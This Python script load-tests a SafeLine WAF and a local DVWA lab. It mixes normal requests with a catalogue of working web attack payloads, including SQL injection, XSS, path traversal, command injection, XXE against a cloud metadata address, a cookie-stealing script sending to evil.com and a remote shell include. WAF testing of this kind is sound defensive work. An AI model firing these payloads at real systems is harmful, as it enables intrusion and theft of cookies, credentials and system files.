#!/usr/bin/env python3
"""
SafeLine Load Testing Runner with Mixed Attack Scenarios
Comprehensive load testing script featuring realistic mixed attack patterns
including SQL injection, XSS, path traversal, command injection, and more.
Simulates various attacker behaviors with different traffic patterns.
"""

import urllib.request
import urllib.parse
import urllib.error
import threading
import time
import json
import random
import concurrent.futures
import signal
import sys
import argparse
from datetime import datetime, timedelta

class LoadTestRunner:
    def __init__(self, duration_hours=1, target_rps=10):
        """
        Initialize load test runner
        
        Args:
            duration_hours (float): Test duration in hours
            target_rps (int): Target requests per second
        """
        self.duration_hours = duration_hours
        self.target_rps = target_rps
        self.total_duration_seconds = duration_hours * 3600
        self.request_interval = 1.0 / target_rps if target_rps > 0 else 1.0
        
        # Test targets
        self.targets = {
            'safeline_waf': 'http://localhost',
            'dvwa_direct': 'http://localhost:3000',
            'test_endpoint': 'http://localhost:3000/index.php'
        }
        
        # Statistics tracking
        self.stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'response_times': [],
            'status_codes': {},
            'attack_types': {},
            'legitimate_requests': 0,
            'malicious_requests': 0,
            'start_time': None,
            'end_time': None,
            'errors': []
        }
        
        self.running = False
        self.lock = threading.Lock()
        
        # Test payloads (safe testing payloads)
        self.test_payloads = [
            {'method': 'GET', 'path': '/', 'data': None},
            {'method': 'GET', 'path': '/index.php', 'data': None},
            {'method': 'GET', 'path': '/login.php', 'data': None},
            {'method': 'POST', 'path': '/login.php', 'data': 'username=test&password=test'},
            {'method': 'GET', 'path': '/setup.php', 'data': None},
            {'method': 'GET', 'path': '/vulnerabilities/', 'data': None},
        ]
        
        # Comprehensive mixed attack scenarios for WAF testing (detection only)
        self.waf_test_payloads = [
            # SQL Injection attacks
            {'method': 'GET', 'path': "/?id=1' OR '1'='1", 'data': None, 'type': 'sql_injection'},
            {'method': 'GET', 'path': "/?id=1' UNION SELECT 1,2,3--", 'data': None, 'type': 'sql_injection'},
            {'method': 'GET', 'path': "/?id=1'; DROP TABLE users--", 'data': None, 'type': 'sql_injection'},
            {'method': 'POST', 'path': '/login.php', 'data': "username=admin'--&password=test", 'type': 'sql_injection'},
            {'method': 'POST', 'path': '/login.php', 'data': "username=admin' OR 1=1#&password=anything", 'type': 'sql_injection'},
            {'method': 'GET', 'path': "/?search=1' AND (SELECT SUBSTRING(@@version,1,1))='5'--", 'data': None, 'type': 'sql_injection'},
            
            # XSS attacks
            {'method': 'GET', 'path': '/?search=<script>alert(1)</script>', 'data': None, 'type': 'xss'},
            {'method': 'GET', 'path': '/?name=<img src=x onerror=alert(1)>', 'data': None, 'type': 'xss'},
            {'method': 'GET', 'path': '/?comment=<svg onload=alert(1)>', 'data': None, 'type': 'xss'},
            {'method': 'POST', 'path': '/guestbook.php', 'data': 'message=<script>document.location="http://evil.com/"+document.cookie</script>', 'type': 'xss'},
            {'method': 'GET', 'path': '/?input=javascript:alert(1)', 'data': None, 'type': 'xss'},
            {'method': 'GET', 'path': '/?data=<iframe src=javascript:alert(1)>', 'data': None, 'type': 'xss'},
            
            # Path traversal attacks
            {'method': 'GET', 'path': '/../../../etc/passwd', 'data': None, 'type': 'path_traversal'},
            {'method': 'GET', 'path': '/..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', 'data': None, 'type': 'path_traversal'},
            {'method': 'GET', 'path': '/?file=../../../etc/shadow', 'data': None, 'type': 'path_traversal'},
            {'method': 'GET', 'path': '/?include=....//....//....//etc/passwd', 'data': None, 'type': 'path_traversal'},
            {'method': 'GET', 'path': '/?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'data': None, 'type': 'path_traversal'},
            
            # Command injection attacks
            {'method': 'GET', 'path': '/?cmd=cat /etc/passwd', 'data': None, 'type': 'command_injection'},
            {'method': 'GET', 'path': '/?ping=127.0.0.1; cat /etc/passwd', 'data': None, 'type': 'command_injection'},
            {'method': 'GET', 'path': '/?input=test`whoami`', 'data': None, 'type': 'command_injection'},
            {'method': 'POST', 'path': '/system.php', 'data': 'command=ls -la; cat /etc/passwd', 'type': 'command_injection'},
            {'method': 'GET', 'path': '/?exec=id && cat /etc/passwd', 'data': None, 'type': 'command_injection'},
            
            # File inclusion attacks
            {'method': 'GET', 'path': '/?file=http://evil.com/shell.txt', 'data': None, 'type': 'file_inclusion'},
            {'method': 'GET', 'path': '/?include=php://input', 'data': None, 'type': 'file_inclusion'},
            {'method': 'GET', 'path': '/?page=data://text/plain,<?php phpinfo(); ?>', 'data': None, 'type': 'file_inclusion'},
            {'method': 'GET', 'path': '/?file=expect://id', 'data': None, 'type': 'file_inclusion'},
            
            # LDAP injection attacks
            {'method': 'GET', 'path': '/?user=admin)(|(password=*))', 'data': None, 'type': 'ldap_injection'},
            {'method': 'POST', 'path': '/ldap.php', 'data': 'username=*)(uid=*))(|(uid=*&password=anything', 'type': 'ldap_injection'},
            
            # XML/XXE attacks
            {'method': 'POST', 'path': '/xml.php', 'data': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', 'type': 'xxe'},
            {'method': 'POST', 'path': '/api/xml', 'data': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', 'type': 'xxe'},
            
            # NoSQL injection attacks
            {'method': 'GET', 'path': '/?user[$ne]=null&password[$ne]=null', 'data': None, 'type': 'nosql_injection'},
            {'method': 'POST', 'path': '/api/login', 'data': '{"username": {"$ne": null}, "password": {"$ne": null}}', 'type': 'nosql_injection'},
            
            # HTTP header injection attacks
            {'method': 'GET', 'path': '/?redirect=http://evil.com', 'data': None, 'type': 'header_injection', 'headers': {'X-Forwarded-For': '127.0.0.1\r\nX-Injected: injected'}},
            {'method': 'GET', 'path': '/', 'data': None, 'type': 'header_injection', 'headers': {'User-Agent': 'Mozilla/5.0\r\nX-Injected: header'}},
            
            # CSRF attacks
            {'method': 'POST', 'path': '/admin/delete_user.php', 'data': 'user_id=1', 'type': 'csrf'},
            {'method': 'GET', 'path': '/admin/transfer.php?amount=1000&to=attacker', 'data': None, 'type': 'csrf'},
            
            # Server-side template injection
            {'method': 'GET', 'path': '/?template={{7*7}}', 'data': None, 'type': 'ssti'},
            {'method': 'GET', 'path': '/?name={{config.items()}}', 'data': None, 'type': 'ssti'},
            
            # CRLF injection
            {'method': 'GET', 'path': '/?url=http://example.com%0d%0aSet-Cookie:%20malicious=true', 'data': None, 'type': 'crlf_injection'},
            
            # Buffer overflow attempts
            {'method': 'GET', 'path': '/?input=' + 'A' * 5000, 'data': None, 'type': 'buffer_overflow'},
            {'method': 'POST', 'path': '/upload.php', 'data': 'data=' + 'B' * 10000, 'type': 'buffer_overflow'},
            
            # SQL injection with advanced techniques
            {'method': 'GET', 'path': "/?id=(SELECT COUNT(*) FROM information_schema.tables)", 'data': None, 'type': 'sql_injection_advanced'},
            {'method': 'GET', 'path': "/?id=1' AND SLEEP(5)--", 'data': None, 'type': 'sql_injection_time_based'},
            {'method': 'GET', 'path': "/?id=1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", 'data': None, 'type': 'sql_injection_error_based'},
            
            # Advanced XSS bypasses
            {'method': 'GET', 'path': '/?input=<ScRiPt>alert(1)</ScRiPt>', 'data': None, 'type': 'xss_case_bypass'},
            {'method': 'GET', 'path': '/?input=<script>alert(String.fromCharCode(88,83,83))</script>', 'data': None, 'type': 'xss_encoding_bypass'},
            {'method': 'GET', 'path': '/?input=<img src=x onerror=eval(atob("YWxlcnQoMSk="))>', 'data': None, 'type': 'xss_obfuscated'},
            
            # Advanced path traversal
            {'method': 'GET', 'path': '/?file=..%252f..%252f..%252fetc%252fpasswd', 'data': None, 'type': 'path_traversal_double_encoded'},
            {'method': 'GET', 'path': '/?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd', 'data': None, 'type': 'path_traversal_unicode'},
            
            # Polyglot payloads (multiple attack types in one)
            {'method': 'GET', 'path': "/?input=jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>", 'data': None, 'type': 'polyglot_xss'},
            {'method': 'GET', 'path': "/?q=1'||'1'='1'/**/union/**/select/**/1,2,3,concat(0x3c,0x73,0x63,0x72,0x69,0x70,0x74,0x3e,0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29,0x3c,0x2f,0x73,0x63,0x72,0x69,0x70,0x74,0x3e)--", 'data': None, 'type': 'polyglot_sqli_xss'},
        ]

    def signal_handler(self, signum, frame):
        """Handle interrupt signals gracefully"""
        print(f"\nReceived signal {signum}. Stopping load test...")
        self.running = False

    def make_request(self, target_url, payload):
        """Make a single HTTP request"""
        start_time = time.time()
        
        try:
            url = target_url + payload['path']
            
            if payload['method'] == 'GET':
                request = urllib.request.Request(url)
            else:  # POST
                data = payload['data'].encode('utf-8') if payload['data'] else None
                request = urllib.request.Request(url, data=data)
                # Handle different content types for POST requests
                if payload.get('type') == 'xxe':
                    request.add_header('Content-Type', 'application/xml')
                elif payload.get('type') == 'nosql_injection' and payload['data'] and payload['data'].startswith('{'):
                    request.add_header('Content-Type', 'application/json')
                else:
                    request.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            # Add common headers with randomization
            user_agents = [
                'LoadTestRunner/1.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'curl/7.68.0',
                'Wget/1.20.3'
            ]
            request.add_header('User-Agent', random.choice(user_agents))
            request.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
            
            # Add custom headers if specified in payload
            if 'headers' in payload:
                for header_name, header_value in payload['headers'].items():
                    request.add_header(header_name, header_value)
            
            with urllib.request.urlopen(request, timeout=10) as response:
                response_time = time.time() - start_time
                status_code = response.getcode()
                content_length = len(response.read())
                
                with self.lock:
                    self.stats['total_requests'] += 1
                    self.stats['successful_requests'] += 1
                    self.stats['response_times'].append(response_time)
                    
                    if status_code not in self.stats['status_codes']:
                        self.stats['status_codes'][status_code] = 0
                    self.stats['status_codes'][status_code] += 1
                    
                    # Track attack types
                    attack_type = payload.get('type', 'legitimate')
                    if attack_type == 'legitimate' or attack_type is None:
                        self.stats['legitimate_requests'] += 1
                    else:
                        self.stats['malicious_requests'] += 1
                        if attack_type not in self.stats['attack_types']:
                            self.stats['attack_types'][attack_type] = 0
                        self.stats['attack_types'][attack_type] += 1
                
                return {
                    'success': True,
                    'status_code': status_code,
                    'response_time': response_time,
                    'content_length': content_length
                }
                
        except Exception as e:
            response_time = time.time() - start_time
            
            with self.lock:
                self.stats['total_requests'] += 1
                self.stats['failed_requests'] += 1
                self.stats['errors'].append(str(e))
                
                # Track attack types for failed requests too
                attack_type = payload.get('type', 'legitimate')
                if attack_type == 'legitimate' or attack_type is None:
                    self.stats['legitimate_requests'] += 1
                else:
                    self.stats['malicious_requests'] += 1
                    if attack_type not in self.stats['attack_types']:
                        self.stats['attack_types'][attack_type] = 0
                    self.stats['attack_types'][attack_type] += 1
            
            return {
                'success': False,
                'error': str(e),
                'response_time': response_time
            }

    def worker_thread(self, target_url, thread_id):
        """Worker thread for generating load with mixed attack scenarios"""
        print(f"Worker thread {thread_id} started")
        
        # Each thread has different attack patterns for realistic traffic
        thread_behavior = thread_id % 10
        
        while self.running:
            # Mixed scenario selection with realistic patterns
            scenario_roll = random.randint(1, 100)
            
            if thread_behavior == 0:  # High-frequency attacker (30% malicious)
                if scenario_roll <= 30:
                    payload = random.choice(self.waf_test_payloads)
                else:
                    payload = random.choice(self.test_payloads)
            elif thread_behavior == 1:  # SQL injection specialist (50% SQL attacks)
                if scenario_roll <= 50:
                    sql_payloads = [p for p in self.waf_test_payloads if 'sql' in p.get('type', '')]
                    payload = random.choice(sql_payloads) if sql_payloads else random.choice(self.test_payloads)
                else:
                    payload = random.choice(self.test_payloads)
            elif thread_behavior == 2:  # XSS specialist (40% XSS attacks)
                if scenario_roll <= 40:
                    xss_payloads = [p for p in self.waf_test_payloads if 'xss' in p.get('type', '')]
                    payload = random.choice(xss_payloads) if xss_payloads else random.choice(self.test_payloads)
                else:
                    payload = random.choice(self.test_payloads)
            elif thread_behavior == 3:  # Path traversal specialist (35% path attacks)
                if scenario_roll <= 35:
                    path_payloads = [p for p in self.waf_test_payloads if 'path_traversal' in p.get('type', '')]
                    payload = random.choice(path_payloads) if path_payloads else random.choice(self.test_payloads)
                else:
                    payload = random.choice(self.test_payloads)
            elif thread_behavior == 4:  # Mixed advanced attacker (25% advanced attacks)
                if scenario_roll <= 25:
                    advanced_payloads = [p for p in self.waf_test_payloads if any(t in p.get('type', '') for t in ['polyglot', 'advanced', 'obfuscated', 'double_encoded'])]
                    payload = random.choice(advanced_payloads) if advanced_payloads else random.choice(self.waf_test_payloads)
                else:
                    payload = random.choice(self.test_payloads)
            elif thread_behavior == 5:  # Burst attacker (sends attacks in bursts)
                if scenario_roll <= 60:  # 60% chance during burst
                    payload = random.choice(self.waf_test_payloads)
                    # Send multiple requests in quick succession during burst
                    for _ in range(random.randint(1, 3)):
                        if self.running:
                            burst_payload = random.choice(self.waf_test_payloads)
                            self.make_request(target_url, burst_payload)
                            time.sleep(0.1)  # Short delay between burst requests
                else:
                    payload = random.choice(self.test_payloads)
            elif thread_behavior == 6:  # Slow and persistent attacker (15% attacks with delays)
                if scenario_roll <= 15:
                    payload = random.choice(self.waf_test_payloads)
                    # Add random delay to simulate persistent but slow attacks
                    time.sleep(random.uniform(0.5, 2.0))
                else:
                    payload = random.choice(self.test_payloads)
            elif thread_behavior == 7:  # Polyglot specialist (focus on complex payloads)
                if scenario_roll <= 20:
                    polyglot_payloads = [p for p in self.waf_test_payloads if 'polyglot' in p.get('type', '')]
                    payload = random.choice(polyglot_payloads) if polyglot_payloads else random.choice(self.waf_test_payloads)
                else:
                    payload = random.choice(self.test_payloads)
            elif thread_behavior == 8:  # Normal user with occasional probes (5% attacks)
                if scenario_roll <= 5:
                    payload = random.choice(self.waf_test_payloads)
                else:
                    payload = random.choice(self.test_payloads)
            else:  # Pure legitimate traffic (thread_behavior == 9)
                payload = random.choice(self.test_payloads)
            
            result = self.make_request(target_url, payload)
            
            # Variable sleep intervals to simulate realistic traffic patterns
            if thread_behavior in [5, 6]:  # Burst or slow attackers
                sleep_time = self.request_interval * random.uniform(0.5, 3.0)
            else:
                sleep_time = self.request_interval * random.uniform(0.8, 1.2)
            
            time.sleep(sleep_time)
        
        print(f"Worker thread {thread_id} stopped")

    def print_stats(self):
        """Print current statistics"""
        with self.lock:
            if self.stats['total_requests'] == 0:
                return
            
            elapsed = time.time() - self.stats['start_time']
            current_rps = self.stats['total_requests'] / elapsed if elapsed > 0 else 0
            
            if self.stats['response_times']:
                avg_response_time = sum(self.stats['response_times']) / len(self.stats['response_times'])
                min_response_time = min(self.stats['response_times'])
                max_response_time = max(self.stats['response_times'])
            else:
                avg_response_time = min_response_time = max_response_time = 0
            
            success_rate = (self.stats['successful_requests'] / self.stats['total_requests']) * 100
            
            print(f"\n{'='*60}")
            print(f"Load Test Statistics - {datetime.now().strftime('%H:%M:%S')}")
            print(f"{'='*60}")
            print(f"Elapsed Time:        {elapsed/3600:.2f} hours ({elapsed:.0f} seconds)")
            print(f"Total Requests:      {self.stats['total_requests']}")
            print(f"Successful:          {self.stats['successful_requests']}")
            print(f"Failed:              {self.stats['failed_requests']}")
            print(f"Success Rate:        {success_rate:.2f}%")
            print(f"Current RPS:         {current_rps:.2f}")
            print(f"Target RPS:          {self.target_rps}")
            print(f"Avg Response Time:   {avg_response_time*1000:.2f}ms")
            print(f"Min Response Time:   {min_response_time*1000:.2f}ms")
            print(f"Max Response Time:   {max_response_time*1000:.2f}ms")
            print(f"Status Codes:        {self.stats['status_codes']}")
            print(f"Legitimate Requests: {self.stats['legitimate_requests']}")
            print(f"Malicious Requests:  {self.stats['malicious_requests']}")
            
            if self.stats['attack_types']:
                print(f"Attack Types:")
                for attack_type, count in sorted(self.stats['attack_types'].items()):
                    percentage = (count / self.stats['total_requests']) * 100
                    print(f"  {attack_type:20s}: {count:4d} ({percentage:5.1f}%)")
            
            remaining_time = self.total_duration_seconds - elapsed
            if remaining_time > 0:
                print(f"Remaining Time:      {remaining_time/3600:.2f} hours ({remaining_time:.0f} seconds)")
            
            print(f"{'='*60}")

    def save_results(self):
        """Save test results to JSON file"""
        with self.lock:
            results = {
                'test_config': {
                    'duration_hours': self.duration_hours,
                    'target_rps': self.target_rps,
                    'total_duration_seconds': self.total_duration_seconds
                },
                'statistics': self.stats.copy(),
                'summary': {
                    'total_duration': self.stats['end_time'] - self.stats['start_time'] if self.stats['end_time'] else 0,
                    'average_rps': self.stats['total_requests'] / (self.stats['end_time'] - self.stats['start_time']) if self.stats['end_time'] and self.stats['start_time'] else 0,
                    'success_rate': (self.stats['successful_requests'] / self.stats['total_requests'] * 100) if self.stats['total_requests'] > 0 else 0,
                    'average_response_time_ms': (sum(self.stats['response_times']) / len(self.stats['response_times']) * 1000) if self.stats['response_times'] else 0
                }
            }
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"load_test_results_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        print(f"\nResults saved to: {filename}")

    def run_load_test(self, target='dvwa_direct'):
        """Run the load test"""
        print(f"SafeLine Load Test Runner")
        print(f"========================")
        print(f"Duration: {self.duration_hours} hours")
        print(f"Target RPS: {self.target_rps}")
        print(f"Target: {self.targets[target]}")
        print(f"Start Time: {datetime.now()}")
        print(f"Expected End Time: {datetime.now() + timedelta(hours=self.duration_hours)}")
        print()
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        target_url = self.targets[target]
        
        # Calculate number of threads based on target RPS
        num_threads = min(max(1, self.target_rps // 10), 50)  # 1-50 threads
        
        print(f"Starting {num_threads} worker threads...")
        
        # Start worker threads
        threads = []
        for i in range(num_threads):
            thread = threading.Thread(target=self.worker_thread, args=(target_url, i))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Monitor progress
        last_stats_time = time.time()
        stats_interval = 30  # Print stats every 30 seconds
        
        try:
            while self.running and (time.time() - self.stats['start_time']) < self.total_duration_seconds:
                time.sleep(1)
                
                # Print stats periodically
                if time.time() - last_stats_time >= stats_interval:
                    self.print_stats()
                    last_stats_time = time.time()
            
            print("\nTest duration completed. Stopping...")
            
        except KeyboardInterrupt:
            print("\nTest interrupted by user. Stopping...")
        
        finally:
            self.running = False
            self.stats['end_time'] = time.time()
            
            # Wait for threads to finish
            print("Waiting for worker threads to stop...")
            for thread in threads:
                thread.join(timeout=5)
            
            # Final statistics
            self.print_stats()
            
            # Save results
            self.save_results()
            
            print(f"\nLoad test completed!")
            print(f"Total duration: {(self.stats['end_time'] - self.stats['start_time'])/3600:.2f} hours")


def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='SafeLine Load Testing Runner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s                                    # Run with defaults (0.5 hours, 20 RPS, SafeLine WAF)
  %(prog)s -d 2 -r 50                        # Run for 2 hours at 50 RPS targeting SafeLine WAF
  %(prog)s --duration 0.25 --rps 100         # Run for 15 minutes at 100 RPS targeting SafeLine WAF
  %(prog)s -d 6 -r 10 -t safeline_waf        # Run for 6 hours at 10 RPS targeting SafeLine WAF
  %(prog)s -d 1 -r 30 -t dvwa_direct         # Run for 1 hour at 30 RPS targeting DVWA directly

Available targets:
  safeline_waf   - Test through SafeLine WAF (http://localhost)
  dvwa_direct    - Test DVWA directly (http://localhost:3000)
  test_endpoint  - Test specific endpoint (http://localhost:3000/index.php)
        '''
    )
    
    parser.add_argument(
        '-d', '--duration',
        type=float,
        default=0.5,
        help='Test duration in hours (default: 0.5)'
    )
    
    parser.add_argument(
        '-r', '--rps',
        type=int,
        default=20,
        help='Target requests per second (default: 20)'
    )
    
    parser.add_argument(
        '-t', '--target',
        choices=['safeline_waf', 'dvwa_direct', 'test_endpoint'],
        default='safeline_waf',
        help='Target endpoint (default: safeline_waf)'
    )
    
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_arguments()
    
    print("SafeLine Load Testing Configuration:")
    print(f"Duration: {args.duration} hours")
    print(f"Target RPS: {args.rps}")
    print(f"Target: {args.target}")
    print("\nPress Ctrl+C to stop the test early\n")
    
    runner = LoadTestRunner(duration_hours=args.duration, target_rps=args.rps)
    runner.run_load_test(target=args.target)